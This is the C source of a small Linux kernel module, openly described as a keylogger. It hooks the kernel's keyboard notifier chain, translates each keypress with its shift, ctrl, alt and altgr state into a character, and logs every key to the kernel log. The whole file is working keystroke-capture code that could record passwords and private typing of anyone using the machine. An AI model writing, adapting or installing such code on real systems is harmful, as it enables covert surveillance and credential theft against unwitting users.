#include <linux/init.h>
#include <linux/module.h>
#include <linux/notifier.h>
#include <linux/keyboard.h>
#include "kloggg-keymap.h" /* produced by output of "loadkeys --mktable" */

MODULE_AUTHOR("Nicholas Hubbard");
MODULE_DESCRIPTION("A keylogger");
MODULE_LICENSE("GPL");

static u_short kloggg_keycode_to_symbol(unsigned int keycode, int shift_mask) {
  u_short symbol;

  if (shift_mask & (1 << KG_SHIFT) && shift_mask & (1 << KG_CTRL)) {
    symbol = shift_ctrl_map[keycode];
  }

  else if (shift_mask & (1 << KG_ALT) && shift_mask & (1 << KG_CTRL)) {
    symbol = ctrl_alt_map[keycode];
  }

  else if (shift_mask & (1 << KG_ALTGR) && shift_mask & (1 << KG_CTRL)) {
    symbol = altgr_ctrl_map[keycode];
  }

  else if (shift_mask & (1 << KG_SHIFT) && shift_mask & (1 << KG_ALT)) {
    symbol = shift_alt_map[keycode];
  }

  else if (shift_mask & (1 << KG_SHIFT)) {
    symbol = shift_map[keycode];
  }

  else if (shift_mask & (1 << KG_ALTGR)) {
    symbol = altgr_map[keycode];
  }

  else if (shift_mask & (1 << KG_ALT)) {
    symbol = alt_map[keycode];
  }

  else if (shift_mask & (1 << KG_CTRL)) {
    symbol = ctrl_map[keycode];
  }
  
  else {
    symbol = plain_map[keycode];
  }
  
  return symbol;
}

static int kloggg_log(struct notifier_block *nb, unsigned long action, void *data) {
  struct keyboard_notifier_param *param = data;

  if (action == KBD_KEYCODE && param->down) {
    unsigned int keycode = param->value;
    int shift_mask = param->shift;
    u_short symbol = kloggg_keycode_to_symbol(keycode, shift_mask);
    printk(KERN_INFO "kloggg: %lc", symbol);
  }

  return NOTIFY_OK;
}

static struct notifier_block kloggg_nb = {
  .notifier_call = kloggg_log
};

/* Module initialization */
static int __init kloggg_init(void) {
  register_keyboard_notifier(&kloggg_nb);
  return 0;
}

/* Module cleanup */
static void __exit kloggg_exit(void) {
  unregister_keyboard_notifier(&kloggg_nb);
}

module_init(kloggg_init);
module_exit(kloggg_exit);
